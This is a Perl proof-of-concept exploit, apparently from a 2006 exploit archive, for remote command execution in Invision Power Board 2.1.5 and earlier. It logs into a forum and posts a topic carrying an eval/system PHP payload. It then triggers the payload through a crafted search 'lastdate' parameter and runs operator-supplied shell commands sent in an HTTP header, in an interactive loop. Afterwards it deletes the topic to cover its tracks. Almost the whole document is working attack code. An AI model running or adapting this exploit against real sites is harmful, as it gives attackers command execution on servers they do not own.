Invision Power Board <= 2.1.5 search.php Remote Code Execution Exploit
======================================================================





#!/usr/bin/perl
# Wed Apr 26 16:44:15 CEST 2006 jolascoaga@514.es
#
# INVISION POWER BOARD 2.1.5 <www.invisionboard.com> pr00f 0f c0ncept
#
# remote command execution. vuln credits goes to IceShaman.
#
# works only if you have perms to post a comment. Exploit with replye is
# in my TODO...
#
# 514 still r0xing.
# !dSR the hardc0re hax0rs ;)
# There is no kwel comments in this release, wait for next upgrade
#######################################################################/

use LWP::UserAgent;
use HTTP::Cookies;
use LWP::Simple;
use HTTP::Request::Common "POST";
use HTTP::Response;
use Getopt::Long;
use strict;

$| = 1; # ;1 = |$

my ($proxy,$proxy_user,$proxy_pass,$lang);
my ($arg_host,$debug,$ipb_user,$ipb_pass, $lang, $errors, $topic_index, $tmp_var);
my ($md5_key, $post_key, $tmp_var);

my %lang_es = (
       &#039;name&#039; => &#039;Spanish Language&#039;,
       &#039;login&#039; => "Ahora est?s identificado",
       &#039;incorrect&#039; => "Nombre de usuario o contrase?a incorrectos",
       &#039;deleted&#039; => "Tema Eliminado"
);

my %lang_en = (
       &#039;name&#039; => &#039;English language&#039;,
       &#039;login&#039; =>  "You are now logged in",
       &#039;incorrect&#039; => "Sorry, we could not find a member using those log in details",
       &#039;deleted&#039;  => &#039;Topic Deleted&#039;,
);
my %lang_strings = ();

my $ua = new LWP::UserAgent(
           cookie_jar=> { file => "$$.cookie" });

my $options = GetOptions (
 &#039;host=s&#039;            => \$arg_host,
 &#039;proxy=s&#039;           => \$proxy,
 &#039;proxy_user=s&#039;      => \$proxy_user,
 &#039;proxy_pass=s&#039;      => \$proxy_pass,
 &#039;ipb_user=s&#039;        => \$ipb_user,
 &#039;ipb_pass=s&#039;        => \$ipb_pass,
 &#039;lang=s&#039;            => \$lang,
 &#039;errors&#039;            => \$errors,
 &#039;debug&#039;             => \$debug);

my ($host, $forum_index) = $arg_host =~ m/(http.*?)index.*?showforum=(.*)/;
print "Host: $host\nForum Index: $forum_index\n" if $debug;

&help unless ($host);

# w0w0w0w0w0 is smarter than some one i know :D
if (!$lang) {
       lang_autodetect();
       print "Detected lang is: $lang_strings{&#039;name&#039;}\n" if $debug;
}

while (1){
   print "invvy:\\> ";
   my $cmd = <STDIN>;
   &invvy($cmd);
}

sub invvy {
       chomp (my $cmd = shift);
       LWP::Debug::level(&#039;+&#039;) if $debug;

       $ua->agent("Morzilla/5.0 (THIS IS AN EXPLOIT. IDS, PLZ, Gr4b ME!!!");

       $ua->proxy([&#039;http&#039;] => $proxy) if $proxy;
       my $req->proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;

       ipb_login (); # This works with redirects enabled/disabled


       ipb_post(); # Post in a main forum.

       ipb_exec ($cmd);

       ipb_delete ($forum_index, $topic_index);
}

sub help {
   print "Syntax: ./$0 <url> [options]\n";
   print "\t--ipb_user, --ipb_pass  (needed if dont allow anonymous posts)\n";
   print "\t--proxy (http), --proxy_user, --proxy_pass\n";
   print "\t--lang=[es|en] (default: autodetect)\n";
   print "\t--debug\n";
   print "\nExample\n";
   print "bash# $0 --host=http://www.somehost.com/index.php?showforum=2\n";
   print "\n";
   exit(1);
}

# sponsorized by coca-cola
sub lang_autodetect {

   my $req = HTTP::Request->new (GET => $host."/index.php");
   $ua->proxy([&#039;http&#039;] => $proxy) if $proxy;
   $req->proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;

   print $req->as_string() if $debug;

   my $res = $ua->request($req);
   my $html = $res->content();

   if (($html =~ /Bienvenido,/) or  ($html =~ /Fecha y Hora actual/)) {
               %lang_strings =  %lang_es;
               return;
   }
   if (($html =~ /Welcome,/) or ($html =~ /Time is now/)) {
               %lang_strings = %lang_en;
               return;
   }
   print "Unknown lang switching to default: &#039;english&#039;\n";
   %lang_strings =  %lang_en;
}

# login function for 2.1.5
sub ipb_login {
       my $content;
       my $h = $host."/index.php?act=Login&CODE=01";
       print $h . "\n" if $debug;
       my $req = POST $h,[
               &#039;referer&#039; => $host,
               &#039;UserName&#039; => $ipb_user,
               &#039;PassWord&#039; => $ipb_pass,
               &#039;CookieDate&#039; => 1
               ]; #grab these, and send to dsr!
       print $req->as_string() if $debug;
       my $res = $ua->request($req);
       if ($errors) {
               print "[+] Context: Login in\n";
               print "HTTP Error code: ".$res->code()."\n";
               print "HTTP Location: ".$res->header("Location")."\n";
               my ($error) = $res->content() =~ m/<body>(.*?)<\/body>/s;
               print "- ERROR -\nFind string: ".$lang_strings{&#039;login&#039;}."\n$error\n- ERROR -\n";
       }
       if ($res->code() eq 302) {
               $content = redirect ($res->header("Location"));

       } else {

               $content = $res->content();
       }

       if ($content =~ /$lang_strings{&#039;login&#039;}/ or $content =~ /Logged in as/) {
           print "Logged in\n" if $errors;
       } else {
          die "Can&#039;t log in\n";
       }

}

sub redirect {
   my ($addr) = @_;
   my $req = HTTP::Request->new (GET => $addr);
   $ua->proxy([&#039;http&#039;] => $proxy) if $proxy;
   $req->proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;

   print $req->as_string() if $debug; # MKSINK is r0xer

   my $res = $ua->request($req);
   my $html = $res->content();

   return $html;
}

sub ipb_post {
       # This is for posting into a main index.

       my $h = $host."/index.php?act=post&do=new_post&f=".$forum_index;

       my $req = HTTP::Request->new (GET => $h);
       $ua->proxy([&#039;http&#039;] => $proxy) if $proxy;
       $req->proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;

       print $req->as_string() if $debug; #dirty_epic r0x++

       my $res = $ua->request($req);
       my $html = $res->content();

       ($md5_key) = $html =~ m/var ipb_md5_check\s+= \"(.*?)\"/;
       ($post_key) = $html =~ m/post_key&#039; value=&#039;(.*?)&#039;/;

       print "AUTH check: $md5_key\n" if $debug;
       print "POST key: $post_key\n" if $debug;

       $tmp_var = int(rand(31337));
       my $exploitme = &#039;eval(system(getenv(HTTP_&#039;.$tmp_var.&#039;))); //&#039;; # seeeeeei la weeeeei
       $h = $host."/index.php";

       print $h."\n" if $debug;

       my $req = POST $h, [
               &#039;st&#039; => 0,
               &#039;act&#039; => "Post",
               &#039;s&#039; => &#039;&#039;,
               &#039;f&#039; => $forum_index,
               &#039;auth_key&#039; => $md5_key,
               &#039;removeattachid&#039; => 0,
               &#039;MAX_FILE_SIZE&#039; => 51200000,
               &#039;CODE&#039; => &#039;01&#039;,
               &#039;post_key&#039; => $post_key,
               &#039;TopicTitle&#039; => &#039;514 pwned&#039;,
               &#039;TopicDesc&#039; => &#039;&#039;,
               &#039;poll_question&#039; => &#039;&#039;,
               &#039;ffont&#039; => 0,
               &#039;fsize&#039; => 0,
               &#039;Post&#039; => $exploitme,
               &#039;post_htmlstatus&#039; => 0,
               &#039;enableemo&#039; => &#039;yes&#039;,
               &#039;enablesig&#039; => &#039;yes&#039;,
               &#039;mod_options&#039; => &#039;nowt&#039;,
               &#039;iconid&#039; => 0,
               &#039;dosubmit&#039; => &#039;Post New Topic&#039;
               ];

       $ua->proxy([&#039;http&#039;] => $proxy) if $proxy;
       $req->proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;

       print $req->as_string() if $debug;
       my $res = $ua->request($req);
       my $html = $res->content();

       print "Location: ".$res->header("Location") if $debug;
       ($topic_index) = $res->header("Location") =~ m/showtopic=(\d+)/;
       if ($errors) {
               print "[+] Context: Creating post\n";
               print "HTTP Error code: ".$res->code()."\n";
               print "HTTP Location: ".$res->header("Location")."\n";
               print "Topic Index: ".$topic_index."\n";
               my ($error) = $res->content() =~ m/<body>(.*?)<\/body>/s;
               print "- ERROR -\nFind string: none\n$error\n- ERROR -\n";
       }

}

sub ipb_delete {
       my ($fid, $tid) = @_;
       my $req;
       print "Deleting Topic: $tid from forum: $fid\n" if $debug;

       my $h = $host."/index.php";
       $req = POST $h, [
                       &#039;st&#039; => 0,
                       &#039;act&#039; => &#039;mod&#039;,
                       &#039;f&#039; => $fid,
                       &#039;auth_key&#039; => $md5_key,
                       &#039;CODE&#039; => &#039;08&#039;,
                       &#039;t&#039; => $tid,
                       &#039;submit&#039; => &#039;Delete this topic&#039;
               ]; # fuck windows automatic reboot
       print $req->as_string() if $debug;
       $ua->proxy([&#039;http&#039;] => $proxy) if $proxy;
       $req->proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;

       my $res = $ua->request($req);

       if ($errors) {
               print "[+] Context: Deleting Topic\n";
               print "HTTP Error code: ".$res->code()."\n";
               print "HTTP Location: ".$res->header("Location")."\n";
               print "Topic Index: ".$topic_index."\n";
               my ($error) = $res->content() =~ m/<body>(.*?)<\/body>/s;
               print "- ERROR -\nFind string: ".$lang_strings{&#039;deleted&#039;}."\n$error\n- ERROR -\n";
       }
       # yow yow
       if ($res->code() eq 200) {
                if ($res->content() =~ /$lang_strings{&#039;deleted&#039;}/) {
                       print "Topic $topic_index deleted\n" if $errors;
               } else {
                       print "Maybe there was errors deleting post: $topic_index\n" if $errors;
               }
       }
}

# shhhhh this is hidden
sub ipb_exec {
       my ($cmd) = @_;
       my $h = $host."/index.php?act=Search&CODE=01";
       my $req = POST $h, [
                       &#039;keywords&#039; => "HTTP_".$tmp_var,
                       &#039;namesearch&#039; => &#039;&#039;,
                       &#039;forums[]&#039; => $forum_index,
                       &#039;prune&#039; => 0,
                       &#039;prune_type&#039; => &#039;newer&#039;,
                       &#039;result_type&#039; => &#039;posts&#039;,
                       &#039;search_in&#039; => &#039;posts&#039;,
                       &#039;sort_key&#039; => &#039;last_post&#039;,
                       &#039;searchsubs&#039; => &#039;1&#039;
               ];
       print $req->as_string() if $debug;
       $ua->proxy([&#039;http&#039;] => $proxy) if $proxy;
       $req->proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;

       my $res = $ua->request($req);
       my $html = $res->content();

       my ($redir) = $html =~ m/url_bit.*?\"(.*?)\"/;
       print "Redirect to: $redir\n" if $errors; # don&#039;t ask

       if ($errors) {
               print "[+] Context: First search\n";
               print "HTTP Error code: ".$res->code()."\n";
               print "HTTP Location: ".$res->header("Location")."\n";
               print "Topic Index: ".$topic_index."\n";
               my ($error) = $res->content() =~ m/<body>(.*?)<\/body>/s;
               print "- ERROR -\nFind string: none\n$error\n- ERROR -\n";
       }

       if ($res->code eq 302) {
               $redir = $res->header("Location");
       }

       # piere - tonite is a great song
       my $req = HTTP::Request->new (GET => $redir.&#039;&lastdate=z|eval.*?%20//)%23e%00&#039;);
       $ua->proxy([&#039;http&#039;] => $proxy) if $proxy;
       $req->header($tmp_var => &#039;echo STARTXPL;&#039;.$cmd.&#039;;echo ENDXPL&#039;);
       $req->proxy_authorization_basic($proxy_user, $proxy_pass) if $proxy_user;

       print $req->as_string() if $debug;

       my $res = $ua->request($req);
       my $html = $res->content();

       $html =~ m/STARTXPL(.*?)ENDXPL/s;
       print $1."\n";

       # no matter with you
       if ($errors) {
               print "[+] Context: Executed\n";
               print "HTTP Error code: ".$res->code()."\n";
               print "HTTP Location: ".$res->header("Location")."\n";
               print "Topic Index: ".$topic_index."\n";
               my ($error) = $res->content() =~ m/<body>(.*?)<\/body>/s;
               print "- ERROR -\nFind string: none\n$error\n- ERROR -\n";
       }

}
# be aware with la roca peoplee


